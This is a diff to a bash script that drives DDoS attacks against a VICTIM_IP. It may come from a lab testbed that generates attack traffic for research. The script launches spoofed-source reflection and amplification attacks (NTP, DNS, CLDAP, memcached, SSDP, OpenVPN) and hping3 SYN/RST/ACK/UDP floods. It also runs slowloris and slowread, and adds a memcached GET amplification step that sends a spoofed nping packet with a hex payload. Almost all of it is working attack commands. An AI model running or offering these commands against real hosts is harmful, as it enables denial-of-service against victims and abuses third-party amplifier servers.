@@ -4,7 +4,7 @@ source /root/ddos_scripts/attack_spec.sh
 
 RED='\033[0;31m' # RED Color
 NC='\033[0m' # No Color
-
+YELLOW='\033[0;33m'
 
 before_attack() {
     #
@@ -12,7 +12,14 @@ before_attack() {
     #
     echo "Attacker commands will be run on: $( uname -a )"
     echo "They are executed by: $( whoami )"
-    iptables -A OUTPUT
+    iptables -N attacker_out
+    iptables -A attacker_out
+    case "$ATTACK_TYPE" in
+        "response")
+            iptables -A OUTPUT --destination $AMP_SERVER_IP -j attacker_out ;;
+        *)
+            iptables -A OUTPUT --destination $VICTIM_IP -j attacker_out    ;;
+    esac
 }
 
 attack_response() {
@@ -49,7 +56,7 @@ attack_response() {
             bash replay_cldap_response.sh $VICTIM_IP $LOOPS
             popd
             ;;
-        "memcached")
+        "memcached-stat")
             pushd /root/ddos_scripts/memcache
             echo $AMP_SERVER_IP > local_server.txt
             ./mem_cache_c $VICTIM_IP $__TARGET_PORT local_server.txt $__NUMBER_OF_THREADS $__PKTS_PER_SECONDS $TIME
@@ -63,14 +70,14 @@ attack_response() {
     esac
 }
 
-attack_querry() {
+attack_query() {
     #
-    # Perform attack which generate querries
+    # Perform attack which generate queries
     #
     case "$ATTACK_VECTOR" in
         "ntp")
             pushd /root/ddos_scripts/ntpdos
-            perl ntp_attack_prl.pl $VICTIM_IP $__SOURCE_IP_QUERRY $PKTS
+            perl ntp_attack_prl.pl $VICTIM_IP $__SOURCE_IP_QUERY $PKTS
             popd
             ;;
         "openvpn")
@@ -78,10 +85,6 @@ attack_querry() {
 
             pushd /root/ddos_scripts/openvpn
             tmp_dir=`mktemp -d -p $(pwd)`
-            for i in {1..9}; do
-            bash replay_openvpn_querry.sh $VICTIM_IP $LOOPS $TEMP_DIR &
-            sleep 0.5
-            done
             bash replay_openvpn_querry.sh $VICTIM_IP $LOOPS $TEMP_DIR
             rm -r $tmp_dir
             popd
@@ -89,7 +92,7 @@ attack_querry() {
         "dns")
             pushd /root/ddos_scripts/dns
             echo $VICTIM_IP > local_server.txt
-            ./dns $__SOURCE_IP_QUERRY $__TARGET_PORT local_server.txt $__NUMBER_OF_THREADS $TIME
+            ./dns $__SOURCE_IP_QUERY $__TARGET_PORT local_server.txt $__NUMBER_OF_THREADS $TIME
             popd
             ;;
         "cldap")
@@ -97,10 +100,10 @@ attack_querry() {
             bash replay_cldap_querry.sh $VICTIM_IP $LOOPS
             popd
             ;;
-        "memcached")
+        "memcached-stat")
             pushd /root/ddos_scripts/memcache
             echo $VICTIM_IP > local_server.txt
-            ./mem_cache_c $__SOURCE_IP_QUERRY $__TARGET_PORT local_server.txt $__NUMBER_OF_THREADS $__PKTS_PER_SECONDS $TIME
+            ./mem_cache_c $__SOURCE_IP_QUERY $__TARGET_PORT local_server.txt $__NUMBER_OF_THREADS $__PKTS_PER_SECONDS $TIME
             popd
             ;;
         "ssdp")
@@ -115,23 +118,21 @@ attack_flood() {
     #
     # Perfrorm flood attack
     #
-    local script
 
     case "$ATTACK_VECTOR" in
         "flood-syn")
-            hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -S "$VICTIM_IP"         ;;
+            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD -L 0 -S "$VICTIM_IP"    ;;
         "flood-rst")
-            hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -M 0 -b -R "$VICTIM_IP" ;;
+            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD -L 0 -b -R "$VICTIM_IP" ;;
         "flood-ack")
-            hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -A "$VICTIM_IP"         ;;
+            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD -L 0 -A "$VICTIM_IP"    ;;
         "flood-udp")
-            hping3 --rand-source -c $PKTS --faster -p ++80 --udp "$VICTIM_IP"         ;;
-        "floods")
-            #TODO need to run all of them in paralel
-            hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -A "$VICTIM_IP" &
-            hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -M 0 -b -R "$VICTIM_IP" &
-            hping3 --rand-source -c $PKTS --faster -p ++80 --udp "$VICTIM_IP" &
-            hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -S "$VICTIM_IP"
+            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD --udp "$VICTIM_IP"      ;;
+        "flood-all")
+            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD -L 0 -A "$VICTIM_IP"    &
+            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD -L 0 -b -R "$VICTIM_IP" &
+            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD --udp "$VICTIM_IP"      &
+            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD -L 0 -S "$VICTIM_IP"
             ;;
     esac
 }
@@ -143,15 +144,30 @@ attack_slow() {
     case "$ATTACK_VECTOR" in
         slowloris)
             slowhttptest -c $__NUMBER_OF_CONNECTIONS -H -i $__INTERVAL_BETWEEN_MESSAGES -l $TIME \
-                -r $__CONNECTIONS_PER_SECOND -t GET -u "http://$VICTIM_IP" -x $__DATA_LENGTH
+                -r $__CONNECTIONS_PER_SECOND -t GET -u "http://$VICTIM_IP" -g -x $__DATA_LENGTH
             ;;
         slowread)
             slowhttptest -c $__NUMBER_OF_CONNECTIONS -X -r $__CONNECTIONS_PER_SECOND -w $__WINDOW_START \
                -y $__WINDOW_END -n $__INTERVAL_BETWEEN_READ -z $__BYTES_READ -k $__REPEAT_REQ \
-                -l $TIME -u "http://$VICTIM_IP"
-            #slowhttptest -c 300 -X -r 200 -n 5 -z 32 -k 1 -l 20 -u http://192.168.100.206
+                -g -l $TIME -u "http://$VICTIM_IP/slowread_file.txt"
             ;;
     esac
+}
+
+attack_mem_get() {
+    #
+    # Memcached-get attack is treated separately for now
+    #
+
+    # Upload data to server
+    pushd /root/ddos_scripts/memcache
+    python3 set_data.py $AMP_SERVER_IP
+    # Wait just in case
+    sleep 1
+
+    # Send GET requests for uploaded data
+    local exploit_data='\x00\x01\x00\x00\x00\x01\x00\x00\x67\x65\x74\x20\x78\x61\x68\x0d\x0a\x0a'
+    nping -c $PKTS --rate $__RATE --udp -S $VICTIM_IP -g $__TARGET_PORT -p 11211 -N --data $exploit_data $AMP_SERVER_IP >mem-get.out
 }
 
 
@@ -161,7 +177,9 @@ after_attack() {
     #
 
     # Make sure that all packets arrive to the destination
-    iptables -vnL OUTPUT; iptables -F;iptables -X
+    echo -e "${YELLOW}$(iptables -vnL attacker_out)${NC}"
+    iptables -F
+    iptables -X
     sleep 1
 }
 
@@ -172,12 +190,12 @@ after_attack() {
 before_attack
 
 case "$ATTACK_VECTOR" in
-    cldap|dns|ntp|ssdp|memcached|openvpn)
+    cldap|dns|ntp|ssdp|memcached-stat|openvpn)
         case "$ATTACK_TYPE" in
             "response")
                 attack_response ;;
-            "querry")
-                attack_querry   ;;
+            "query")
+                attack_query   ;;
             *)
                 echo -e "${RED}Wrong attack type argument: '$ATTACK_TYPE'!${NC}"
                 exit 1
@@ -185,10 +203,12 @@ case "$ATTACK_VECTOR" in
         esac
         ;;
     slowloris|slowread)
-        attack_slow     ;;
+        attack_slow         ;;
+    memcached-get)
+        attack_mem_get      ;;
     # All other options should be flood
     *)
-        attack_flood     ;;
+        attack_flood        ;;
 esac
 
 after_attack
